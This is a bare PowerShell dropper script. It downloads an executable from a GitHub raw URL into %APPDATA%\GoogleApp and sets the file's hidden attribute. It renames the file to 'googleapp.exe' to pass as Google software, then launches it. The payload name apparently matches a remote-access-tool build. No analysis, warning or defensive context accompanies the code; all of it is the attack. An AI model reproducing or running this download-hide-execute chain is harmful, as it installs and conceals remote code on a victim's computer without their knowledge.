$url = "https://github.com/ioik432/powershell/raw/main/Client-built.exe"

$finalPath = Join-Path $env:APPDATA -ChildPath "GoogleApp\Client-built.exe"

Invoke-WebRequest -Uri $url -OutFile $finalPath

Set-ItemProperty -Path $finalPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

$nyttNamn = "googleapp.exe"
$nyttNamnPath = Join-Path $env:APPDATA -ChildPath "GoogleApp\$nyttNamn"

Rename-Item -Path $finalPath -NewName $nyttNamn

Start-Process -FilePath $nyttNamnPath
